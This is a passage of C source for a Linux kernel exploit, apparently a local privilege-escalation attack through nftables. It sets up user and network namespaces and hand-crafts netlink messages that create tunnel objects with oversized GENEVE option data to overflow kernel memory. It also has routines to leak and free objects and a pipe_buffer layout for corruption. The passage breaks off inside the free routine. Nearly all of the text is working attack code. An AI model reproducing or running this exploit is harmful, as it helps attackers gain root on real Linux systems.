//gcc ./exp.c -o exp -g -static -masm=intel
#define _GNU_SOURCE
#include <endian.h>
#include <libmnl/libmnl.h>
#include <linux/netfilter/nf_tables.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netlink.h>
#include <linux/pkt_cls.h>
#include <linux/rtnetlink.h>
#include <linux/tc_act/tc_tunnel_key.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/netfilter.h>
#include <ctype.h>
#define pause() {write(STDOUT_FILENO, "[*] Paused (press enter to continue)\n", 37); getchar();}
#include <net/if.h>
#include <sys/prctl.h>
#include <sys/wait.h>
// #include <arpa/inet.h>
#include <linux/if_packet.h>
#include "liburing.h"
#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif


int setup()
{
	if (unshare(CLONE_NEWUSER) == -1) {
		perror("unshare(CLONE_NEWUSER)");
		return -1;
	}

	if (unshare(CLONE_NEWNET) == -1) {
		perror("unshare(CLONE_NEWNET)");
		return -1;
	}

	return 0;
}

void bind_core(int core)
{
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
    puts("Process binded to core");
}	


struct page;
struct pipe_inode_info;
struct pipe_buf_operations;

/* read start from offset to (len+offset), write start from (len+offset) */
struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};

struct pipe_buf_operations {

    int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);

    void (*release)(struct pipe_inode_info *, struct pipe_buffer *);

    int (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);

    int (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};


void err_exit(const char *msg) {
	puts(msg);
	exit(EXIT_FAILURE);
}

// this is a universal function to print binary data from a char* array
void print_binary(void *addr, int len) 
{
    size_t *buf64 = (size_t *) addr;
    char *buf8 = (char *) addr;
    for (int i = 0; i < len / 8; i += 2) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 2; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 16 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

struct nlhead {
	uint32_t nlmsg_len; /* Length of message including header */
	uint16_t nlmsg_type; /* Message content */
	uint16_t nlmsg_flags; /* Additional flags */
	uint32_t nlmsg_seq; /* Sequence number */
	uint32_t nlmsg_pid; /* Sending process port ID */
	uint8_t nfgen_family;
	uint8_t version;
	uint16_t res_id;
	uint8_t payload[0x500];
};

int fd;
void alloc_table(int tab_idx){
	struct iovec iov;
	struct msghdr msg = {
	    .msg_name = NULL,
	    .msg_namelen = 0,
	    .msg_iov = &iov,
	    .msg_iovlen = 1,
	    .msg_control = NULL,
	    .msg_controllen = 0,
	    .msg_flags = 0,
	};

	struct nlhead nlh_batch_start = {
	    .nlmsg_len = 0x14,
	    .nlmsg_type = NFNL_MSG_BATCH_BEGIN,
	    .nlmsg_flags = 0,
	    .nlmsg_seq = 0,
	    .nlmsg_pid = 0,
	    .nfgen_family = 0,
	    .version = 0,
	    .res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};

	struct nlhead nlh_batch_end = {
	    .nlmsg_len = 0x14,
	    .nlmsg_type = NFNL_MSG_BATCH_END,
	    .nlmsg_flags = NLM_F_REQUEST,
	    .nlmsg_seq = 0,
	    .nlmsg_pid = 0,
	    .nfgen_family = 0,
	    .version = 0,
	    .res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};

	struct nlhead nlh_new_table = {
	    .nlmsg_len = 0x20,
	    .nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE,
	    .nlmsg_flags = NLM_F_REQUEST,
	    .nlmsg_seq = 0,
	    .nlmsg_pid = 0,
	    .nfgen_family = NFPROTO_NETDEV,
	    .version = 0,
	    .res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};
	struct nlattr* table_name = (struct nlattr*)nlh_new_table.payload;
	char tab_name[8] = {0};
	snprintf(tab_name, 8, "tab%d", tab_idx);
	table_name->nla_len = 9,
	table_name->nla_type = 1,
	memcpy(&nlh_new_table.payload[sizeof(struct nlattr)], tab_name, 8);
	

	// memcpy(&nlh_new_table.payload[sizeof(struct nlattr)], "tab0\0", 5);

	uint8_t payload[0x1000];
	int payload_size = 0;
	memcpy(&payload[payload_size], &nlh_batch_start, sizeof(nlh_batch_start));
	payload_size += MNL_ALIGN(nlh_batch_start.nlmsg_len);
	memcpy(&payload[payload_size], &nlh_new_table, nlh_new_table.nlmsg_len);
	payload_size += MNL_ALIGN(nlh_new_table.nlmsg_len);
	memcpy(&payload[payload_size], &nlh_batch_end, sizeof(nlh_batch_end));
	payload_size += MNL_ALIGN(nlh_batch_end.nlmsg_len);
	iov.iov_base = payload;
	iov.iov_len = payload_size;
	sendmsg(fd, &msg, 0);
}


void alloc_obj_with_overflow(int tab_idx, int idx, bool overflow, int overflow_size, uint8_t* overflow_data, int offset){
	struct iovec iov;
	struct msghdr msg = {
		.msg_name = NULL,
		.msg_namelen = 0,
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = NULL,
		.msg_controllen = 0,
		.msg_flags = 0,
	};

	struct nlhead nlh_batch_start = {
		.nlmsg_len = 0x14,
		.nlmsg_type = NFNL_MSG_BATCH_BEGIN,
		.nlmsg_flags = 0,
		.nlmsg_seq = 0,
		.nlmsg_pid = 0,
		.nfgen_family = 0,
		.version = 0,
		.res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};

	int attr_size = 0;
	struct nlhead nlh_NFT_OBJECT_TUNNEL = {
		.nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWOBJ,
		.nlmsg_flags = NLM_F_REQUEST,
		.nlmsg_seq = 0,
		.nlmsg_pid = 0,
		.nfgen_family = NFPROTO_NETDEV,
		.version = 0,
		.res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};
	// NFTA_OBJ_TABLE
	struct nlattr* OBJ_TABLE = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	OBJ_TABLE->nla_len = 9;
	OBJ_TABLE->nla_type = NFTA_OBJ_TABLE;
	// memcpy(&nlh_NFT_OBJECT_TUNNEL.payload[attr_size + sizeof(struct nlattr)], "tab0\000", 5);
	char tab_name[8]={0};
	snprintf(tab_name, 8, "tab%d", tab_idx);
	memcpy(&nlh_NFT_OBJECT_TUNNEL.payload[attr_size + sizeof(struct nlattr)], tab_name, 8);

	attr_size += MNL_ALIGN(OBJ_TABLE->nla_len);

	// NFTA_OBJ_TYPE
	struct nlattr* OBJ_TYPE = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	OBJ_TYPE->nla_len = 8;
	OBJ_TYPE->nla_type = NFTA_OBJ_TYPE | 0x4000;
	int obj_type = htobe32(NFT_OBJECT_TUNNEL);
	memcpy(&nlh_NFT_OBJECT_TUNNEL.payload[attr_size + sizeof(struct nlattr)], &obj_type, sizeof(obj_type));
	attr_size += MNL_ALIGN(OBJ_TYPE->nla_len);

	// NFTA_OBJ_NAME
	struct nlattr* OBJ_NAME = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	OBJ_NAME->nla_len = 0xC;
	OBJ_NAME->nla_type = NFTA_OBJ_NAME;
	char obj_name[8];
	memset(obj_name, 0, sizeof(obj_name));
	snprintf(obj_name, 8, "obj%ld", idx);
	memcpy(&nlh_NFT_OBJECT_TUNNEL.payload[attr_size + sizeof(struct nlattr)], obj_name, strlen(obj_name) + 1);
	attr_size += MNL_ALIGN(OBJ_NAME->nla_len);

	// NFTA_OBJ_DATA
	struct nlattr* OBJ_DATA = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	OBJ_DATA->nla_len = 4; // need fix
	OBJ_DATA->nla_type = NFTA_OBJ_DATA | 0x8000;
	attr_size += MNL_ALIGN(OBJ_DATA->nla_len);

	// NFTA_OBJ_DATA --- nft_tunnel_key_policy_ipv4
	struct nlattr* nft_tunnel_key_policy_ipv4 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	nft_tunnel_key_policy_ipv4->nla_len = 4; // need fix
	nft_tunnel_key_policy_ipv4->nla_type = NFTA_TUNNEL_KEY_IP | 0x8000;
	attr_size += MNL_ALIGN(nft_tunnel_key_policy_ipv4->nla_len);

	// NFTA_OBJ_DATA --- nft_tunnel_key_policy_ipv4 --- NFTA_TUNNEL_KEY_IP_DST
	struct nlattr* TUNNEL_KEY_IP_DST = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_IP_DST->nla_len = 0x8;
	TUNNEL_KEY_IP_DST->nla_type = NFTA_TUNNEL_KEY_IP_DST;
	attr_size += MNL_ALIGN(TUNNEL_KEY_IP_DST->nla_len);

	// NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_ID
	struct nlattr* TUNNEL_KEY_ID = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_ID->nla_len = 0x8;
	TUNNEL_KEY_ID->nla_type = NFTA_TUNNEL_KEY_ID;
	attr_size += MNL_ALIGN(TUNNEL_KEY_ID->nla_len);



	// NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS
	struct nlattr* TUNNEL_KEY_OPTS = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_OPTS->nla_len = 4; // need fix
	TUNNEL_KEY_OPTS->nla_type = NFTA_TUNNEL_KEY_OPTS | 0x8000;
	attr_size += MNL_ALIGN(TUNNEL_KEY_OPTS->nla_len);

	// NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS --- NFTA_TUNNEL_KEY_OPTS_GENEVE_1
	struct nlattr* TUNNEL_KEY_OPTS_GENEVE_1 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_OPTS_GENEVE_1->nla_len = 4; // need fix
	TUNNEL_KEY_OPTS_GENEVE_1->nla_type = NFTA_TUNNEL_KEY_OPTS_GENEVE | 0x8000;
	attr_size += MNL_ALIGN(TUNNEL_KEY_OPTS_GENEVE_1->nla_len);

	// NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS --- NFTA_TUNNEL_KEY_OPTS_GENEVE_1 --- NFTA_TUNNEL_KEY_GENEVE_TYPE
	struct nlattr* TUNNEL_KEY_GENEVE_TYPE_1 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_GENEVE_TYPE_1->nla_len = 5;
	TUNNEL_KEY_GENEVE_TYPE_1->nla_type = NFTA_TUNNEL_KEY_GENEVE_TYPE;
	attr_size += MNL_ALIGN(TUNNEL_KEY_GENEVE_TYPE_1->nla_len);

	// NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS --- NFTA_TUNNEL_KEY_OPTS_GENEVE_1 --- NFTA_TUNNEL_KEY_GENEVE_CLASS
	struct nlattr* TUNNEL_KEY_GENEVE_CLASS_1 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_GENEVE_CLASS_1->nla_len = 6;
	TUNNEL_KEY_GENEVE_CLASS_1->nla_type = NFTA_TUNNEL_KEY_GENEVE_CLASS | 0x4000;
	attr_size += MNL_ALIGN(TUNNEL_KEY_GENEVE_CLASS_1->nla_len);

	// NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS --- NFTA_TUNNEL_KEY_OPTS_GENEVE_1 --- NFTA_TUNNEL_KEY_GENEVE_DATA
	struct nlattr* TUNNEL_KEY_GENEVE_DATA_1 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_GENEVE_DATA_1->nla_len = 0x58;
	TUNNEL_KEY_GENEVE_DATA_1->nla_len += offset;
	TUNNEL_KEY_GENEVE_DATA_1->nla_type = NFTA_TUNNEL_KEY_GENEVE_DATA;
	attr_size += MNL_ALIGN(TUNNEL_KEY_GENEVE_DATA_1->nla_len);



	// NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS --- NFTA_TUNNEL_KEY_OPTS_GENEVE_2
	struct nlattr* TUNNEL_KEY_OPTS_GENEVE_2 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_OPTS_GENEVE_2->nla_len = 4; // need fix
	TUNNEL_KEY_OPTS_GENEVE_2->nla_type = NFTA_TUNNEL_KEY_OPTS_GENEVE | 0x8000;
	attr_size += MNL_ALIGN(TUNNEL_KEY_OPTS_GENEVE_2->nla_len);

	// NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS --- NFTA_TUNNEL_KEY_OPTS_GENEVE_2 --- NFTA_TUNNEL_KEY_GENEVE_TYPE
	struct nlattr* TUNNEL_KEY_GENEVE_TYPE_2 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_GENEVE_TYPE_2->nla_len = 5;
	TUNNEL_KEY_GENEVE_TYPE_2->nla_type = NFTA_TUNNEL_KEY_GENEVE_TYPE;
	attr_size += MNL_ALIGN(TUNNEL_KEY_GENEVE_TYPE_2->nla_len);

	// NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS --- NFTA_TUNNEL_KEY_OPTS_GENEVE_2 --- NFTA_TUNNEL_KEY_GENEVE_CLASS
	struct nlattr* TUNNEL_KEY_GENEVE_CLASS_2 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_GENEVE_CLASS_2->nla_len = 6;
	TUNNEL_KEY_GENEVE_CLASS_2->nla_type = NFTA_TUNNEL_KEY_GENEVE_CLASS | 0x4000;
	attr_size += MNL_ALIGN(TUNNEL_KEY_GENEVE_CLASS_2->nla_len);

	// NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS --- NFTA_TUNNEL_KEY_OPTS_GENEVE_2 --- NFTA_TUNNEL_KEY_GENEVE_DATA
	struct nlattr* TUNNEL_KEY_GENEVE_DATA_2 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_GENEVE_DATA_2->nla_len = 0x10; // 调整这里控制溢出字节数
	TUNNEL_KEY_GENEVE_DATA_2->nla_type = NFTA_TUNNEL_KEY_GENEVE_DATA;
	memset(&nlh_NFT_OBJECT_TUNNEL.payload[attr_size + sizeof(struct nlattr)], 0, 0xc);
	if (overflow) {
		TUNNEL_KEY_GENEVE_DATA_2->nla_len += overflow_size;
		memcpy(&nlh_NFT_OBJECT_TUNNEL.payload[attr_size + sizeof(struct nlattr) + 0xc], overflow_data, overflow_size);
	}

	attr_size += MNL_ALIGN(TUNNEL_KEY_GENEVE_DATA_2->nla_len);

	TUNNEL_KEY_OPTS_GENEVE_2->nla_len += MNL_ALIGN(TUNNEL_KEY_GENEVE_TYPE_2->nla_len) + MNL_ALIGN(TUNNEL_KEY_GENEVE_CLASS_2->nla_len) + MNL_ALIGN(TUNNEL_KEY_GENEVE_DATA_2->nla_len);
	TUNNEL_KEY_OPTS_GENEVE_1->nla_len += MNL_ALIGN(TUNNEL_KEY_GENEVE_TYPE_1->nla_len) + MNL_ALIGN(TUNNEL_KEY_GENEVE_CLASS_1->nla_len) + MNL_ALIGN(TUNNEL_KEY_GENEVE_DATA_1->nla_len);
	TUNNEL_KEY_OPTS->nla_len += TUNNEL_KEY_OPTS_GENEVE_2->nla_len + TUNNEL_KEY_OPTS_GENEVE_1->nla_len;
	nft_tunnel_key_policy_ipv4->nla_len += MNL_ALIGN(TUNNEL_KEY_IP_DST->nla_len);
	OBJ_DATA->nla_len += nft_tunnel_key_policy_ipv4->nla_len + MNL_ALIGN(TUNNEL_KEY_ID->nla_len) + MNL_ALIGN(TUNNEL_KEY_OPTS->nla_len);

	nlh_NFT_OBJECT_TUNNEL.nlmsg_len = 0x14 + attr_size;

	uint8_t payload[0x1000];
	int payload_size = 0;
	memcpy(&payload[payload_size], &nlh_batch_start, sizeof(nlh_batch_start));
	payload_size += MNL_ALIGN(nlh_batch_start.nlmsg_len);
	memcpy(&payload[payload_size], &nlh_NFT_OBJECT_TUNNEL, nlh_NFT_OBJECT_TUNNEL.nlmsg_len);
	payload_size += MNL_ALIGN(nlh_NFT_OBJECT_TUNNEL.nlmsg_len);

	struct nlhead nlh_batch_end = {
		.nlmsg_len = 0x14,
		.nlmsg_type = NFNL_MSG_BATCH_END,
		.nlmsg_flags = NLM_F_REQUEST,
		.nlmsg_seq = 0,
		.nlmsg_pid = 0,
		.nfgen_family = 0,
		.version = 0,
		.res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};
	memcpy(&payload[payload_size], &nlh_batch_end, sizeof(nlh_batch_end));
	payload_size += MNL_ALIGN(nlh_batch_end.nlmsg_len);
	iov.iov_base = payload;
	iov.iov_len = payload_size;
	sendmsg(fd, &msg, 0);
	
}


void alloc_leak_obj(int tab_idx, int idx){
	struct iovec iov;
	struct msghdr msg = {
	    .msg_name = NULL,
	    .msg_namelen = 0,
	    .msg_iov = &iov,
	    .msg_iovlen = 1,
	    .msg_control = NULL,
	    .msg_controllen = 0,
	    .msg_flags = 0,
	};

	struct nlhead nlh_batch_start = {
	    .nlmsg_len = 0x14,
	    .nlmsg_type = NFNL_MSG_BATCH_BEGIN,
	    .nlmsg_flags = 0,
	    .nlmsg_seq = 0,
	    .nlmsg_pid = 0,
	    .nfgen_family = 0,
	    .version = 0,
	    .res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};

	struct nlhead nlh_batch_end = {
	    .nlmsg_len = 0x14,
	    .nlmsg_type = NFNL_MSG_BATCH_END,
	    .nlmsg_flags = NLM_F_REQUEST,
	    .nlmsg_seq = 0,
	    .nlmsg_pid = 0,
	    .nfgen_family = 0,
	    .version = 0,
	    .res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};
	
	int attr_size = 0;
	struct nlhead nlh_NFT_OBJECT_TUNNEL = {
	    .nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWOBJ,
	    .nlmsg_flags = NLM_F_REQUEST,
	    .nlmsg_seq = 0,
	    .nlmsg_pid = 0,
	    .nfgen_family = NFPROTO_NETDEV,
	    .version = 0,
	    .res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};
	// NFTA_OBJ_TABLE
    struct nlattr* OBJ_TABLE = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	OBJ_TABLE->nla_len = 9;
	OBJ_TABLE->nla_type = NFTA_OBJ_TABLE;
	
    // memcpy(&nlh_NFT_OBJECT_TUNNEL.payload[attr_size + sizeof(struct nlattr)], "tab0\000", 5);
	char tab_name[8] = {0};
	snprintf(tab_name, 8, "tab%d", tab_idx);
    memcpy(&nlh_NFT_OBJECT_TUNNEL.payload[attr_size + sizeof(struct nlattr)], tab_name, 8);

	attr_size += MNL_ALIGN(OBJ_TABLE->nla_len);

	// NFTA_OBJ_TYPE
    struct nlattr* OBJ_TYPE = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	OBJ_TYPE->nla_len = 8;
	OBJ_TYPE->nla_type = NFTA_OBJ_TYPE | 0x4000;
    int obj_type = htobe32(NFT_OBJECT_TUNNEL);
    memcpy(&nlh_NFT_OBJECT_TUNNEL.payload[attr_size + sizeof(struct nlattr)], &obj_type, sizeof(obj_type));
	attr_size += MNL_ALIGN(OBJ_TYPE->nla_len);

	// NFTA_OBJ_NAME
	struct nlattr* OBJ_NAME = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	OBJ_NAME->nla_len = 0xC;
	OBJ_NAME->nla_type = NFTA_OBJ_NAME;
	char obj_name[8];
	memset(obj_name, 0, sizeof(obj_name));
	snprintf(obj_name, 8, "obj%d", idx);
	memcpy(&nlh_NFT_OBJECT_TUNNEL.payload[attr_size + sizeof(struct nlattr)], obj_name, strlen(obj_name) + 1);
	attr_size += MNL_ALIGN(OBJ_NAME->nla_len);

    // NFTA_OBJ_DATA
	struct nlattr* OBJ_DATA = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	OBJ_DATA->nla_len = 4; // need fix
	OBJ_DATA->nla_type = NFTA_OBJ_DATA | 0x8000;
	attr_size += MNL_ALIGN(OBJ_DATA->nla_len);

	// NFTA_OBJ_DATA --- nft_tunnel_key_policy_ipv6
	struct nlattr* nft_tunnel_key_policy_ipv6 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	nft_tunnel_key_policy_ipv6->nla_len = 4; // need fix
	nft_tunnel_key_policy_ipv6->nla_type = NFTA_TUNNEL_KEY_IP6 | 0x8000;
	attr_size += MNL_ALIGN(nft_tunnel_key_policy_ipv6->nla_len);

	// NFTA_OBJ_DATA --- nft_tunnel_key_policy_ipv6 --- NFTA_TUNNEL_KEY_IP6_FLOWLABEL
	struct nlattr* TUNNEL_KEY_IP6_FLOWLABEL = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_IP6_FLOWLABEL->nla_len = 8;
	TUNNEL_KEY_IP6_FLOWLABEL->nla_type = NFTA_TUNNEL_KEY_IP6_FLOWLABEL | 0x4000;
	attr_size += MNL_ALIGN(TUNNEL_KEY_IP6_FLOWLABEL->nla_len);

	// NFTA_OBJ_DATA --- nft_tunnel_key_policy_ipv6 --- NFTA_TUNNEL_KEY_IP6_SRC
	struct nlattr* TUNNEL_KEY_IP6_SRC = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_IP6_SRC->nla_len = 0x14;
	TUNNEL_KEY_IP6_SRC->nla_type = NFTA_TUNNEL_KEY_IP6_SRC;
	attr_size += MNL_ALIGN(TUNNEL_KEY_IP6_SRC->nla_len);

	// NFTA_OBJ_DATA --- nft_tunnel_key_policy_ipv6 --- NFTA_TUNNEL_KEY_IP6_DST
	struct nlattr* TUNNEL_KEY_IP6_DST = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_IP6_DST->nla_len = 0x14;
	TUNNEL_KEY_IP6_DST->nla_type = NFTA_TUNNEL_KEY_IP6_DST;
	attr_size += MNL_ALIGN(TUNNEL_KEY_IP6_DST->nla_len);

    // NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_ID
    struct nlattr* TUNNEL_KEY_ID = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_ID->nla_len = 0x8;
	TUNNEL_KEY_ID->nla_type = NFTA_TUNNEL_KEY_ID;
	attr_size += MNL_ALIGN(TUNNEL_KEY_ID->nla_len);



    // NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS
    struct nlattr* TUNNEL_KEY_OPTS = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_OPTS->nla_len = 4; // need fix
	TUNNEL_KEY_OPTS->nla_type = NFTA_TUNNEL_KEY_OPTS | 0x8000;
	attr_size += MNL_ALIGN(TUNNEL_KEY_OPTS->nla_len);


    // NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS --- NFTA_TUNNEL_KEY_OPTS_GENEVE_2
    struct nlattr* TUNNEL_KEY_OPTS_GENEVE_2 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_OPTS_GENEVE_2->nla_len = 4; // need fix
	TUNNEL_KEY_OPTS_GENEVE_2->nla_type = NFTA_TUNNEL_KEY_OPTS_GENEVE | 0x8000;
	attr_size += MNL_ALIGN(TUNNEL_KEY_OPTS_GENEVE_2->nla_len);

    // NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS --- NFTA_TUNNEL_KEY_OPTS_GENEVE_2 --- NFTA_TUNNEL_KEY_GENEVE_TYPE
    struct nlattr* TUNNEL_KEY_GENEVE_TYPE_2 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_GENEVE_TYPE_2->nla_len = 5;
	TUNNEL_KEY_GENEVE_TYPE_2->nla_type = NFTA_TUNNEL_KEY_GENEVE_TYPE;
	attr_size += MNL_ALIGN(TUNNEL_KEY_GENEVE_TYPE_2->nla_len);

    // NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS --- NFTA_TUNNEL_KEY_OPTS_GENEVE_2 --- NFTA_TUNNEL_KEY_GENEVE_CLASS
    struct nlattr* TUNNEL_KEY_GENEVE_CLASS_2 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_GENEVE_CLASS_2->nla_len = 6;
	TUNNEL_KEY_GENEVE_CLASS_2->nla_type = NFTA_TUNNEL_KEY_GENEVE_CLASS | 0x4000;
	attr_size += MNL_ALIGN(TUNNEL_KEY_GENEVE_CLASS_2->nla_len);

    // NFTA_OBJ_DATA --- NFTA_TUNNEL_KEY_OPTS --- NFTA_TUNNEL_KEY_OPTS_GENEVE_2 --- NFTA_TUNNEL_KEY_GENEVE_DATA
    struct nlattr* TUNNEL_KEY_GENEVE_DATA_2 = (struct nlattr*)&nlh_NFT_OBJECT_TUNNEL.payload[attr_size];
	TUNNEL_KEY_GENEVE_DATA_2->nla_len = 0x84; // 只能是0x84 触发5bit溢出
	TUNNEL_KEY_GENEVE_DATA_2->nla_type = NFTA_TUNNEL_KEY_GENEVE_DATA;
	memset(&nlh_NFT_OBJECT_TUNNEL.payload[attr_size + sizeof(struct nlattr)], 0, 0x80);
	nlh_NFT_OBJECT_TUNNEL.payload[attr_size + sizeof(struct nlattr) + 0xF] = 0x15;
    attr_size += MNL_ALIGN(TUNNEL_KEY_GENEVE_DATA_2->nla_len);


    TUNNEL_KEY_OPTS_GENEVE_2->nla_len += MNL_ALIGN(TUNNEL_KEY_GENEVE_TYPE_2->nla_len) + MNL_ALIGN(TUNNEL_KEY_GENEVE_CLASS_2->nla_len) + MNL_ALIGN(TUNNEL_KEY_GENEVE_DATA_2->nla_len);
	TUNNEL_KEY_OPTS->nla_len += TUNNEL_KEY_OPTS_GENEVE_2->nla_len;
    nft_tunnel_key_policy_ipv6->nla_len += MNL_ALIGN(TUNNEL_KEY_IP6_FLOWLABEL->nla_len) + MNL_ALIGN(TUNNEL_KEY_IP6_SRC->nla_len) + MNL_ALIGN(TUNNEL_KEY_IP6_DST->nla_len);
    OBJ_DATA->nla_len += nft_tunnel_key_policy_ipv6->nla_len + MNL_ALIGN(TUNNEL_KEY_ID->nla_len) + MNL_ALIGN(TUNNEL_KEY_OPTS->nla_len);

	nlh_NFT_OBJECT_TUNNEL.nlmsg_len = 0x14 + attr_size;

	uint8_t payload[0x1000];
	int payload_size = 0;
	memcpy(&payload[payload_size], &nlh_batch_start, sizeof(nlh_batch_start));
	payload_size += MNL_ALIGN(nlh_batch_start.nlmsg_len);
	memcpy(&payload[payload_size], &nlh_NFT_OBJECT_TUNNEL, nlh_NFT_OBJECT_TUNNEL.nlmsg_len);
	payload_size += MNL_ALIGN(nlh_NFT_OBJECT_TUNNEL.nlmsg_len);
	memcpy(&payload[payload_size], &nlh_batch_end, sizeof(nlh_batch_end));
	payload_size += MNL_ALIGN(nlh_batch_end.nlmsg_len);
	iov.iov_base = payload;
	iov.iov_len = payload_size;
	sendmsg(fd, &msg, 0);
}

void free_obj(int idx){
	struct iovec iov;
	struct msghdr msg = {
	    .msg_name = NULL,
	    .msg_namelen = 0,
	    .msg_iov = &iov,
	    .msg_iovlen = 1,
	    .msg_control = NULL,
	    .msg_controllen = 0,
	    .msg_flags = 0,
	};



	struct nlhead nlh_batch_start = {
	    .nlmsg_len = 0x14,
	    .nlmsg_type = NFNL_MSG_BATCH_BEGIN,
	    .nlmsg_flags = 0,
	    .nlmsg_seq = 0,
	    .nlmsg_pid = 0,
	    .nfgen_family = 0,
	    .version = 0,
	    .res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};

	struct nlhead nlh_batch_end = {
	    .nlmsg_len = 0x14,
	    .nlmsg_type = NFNL_MSG_BATCH_END,
	    .nlmsg_flags = NLM_F_REQUEST,
	    .nlmsg_seq = 0,
	    .nlmsg_pid = 0,
	    .nfgen_family = 0,
	    .version = 0,
	    .res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};
	struct nlhead nlh_GET_OBJ = {
	    .nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_DELOBJ,
	    .nlmsg_flags = NLM_F_REQUEST,
	    .nlmsg_seq = 0,
	    .nlmsg_pid = 0,
	    .nfgen_family = NFPROTO_NETDEV,
	    .version = 0,
	    .res_id = htobe16(NFNL_SUBSYS_NFTABLES),
	};

	int attr_size = 0;
	// NFTA_OBJ_TABLE
	struct nlattr* OBJ_TABLE = (struct nlattr*)&nlh_GET_OBJ.payload[attr_size];
	OBJ_TABLE->nla_len = 9;
	OBJ_TABLE->nla_type = NFTA_OBJ_TABLE;
    memcpy(&nlh_GET_OBJ.payload[attr_size + sizeof(struct nlattr)], "tab0\000", 5);
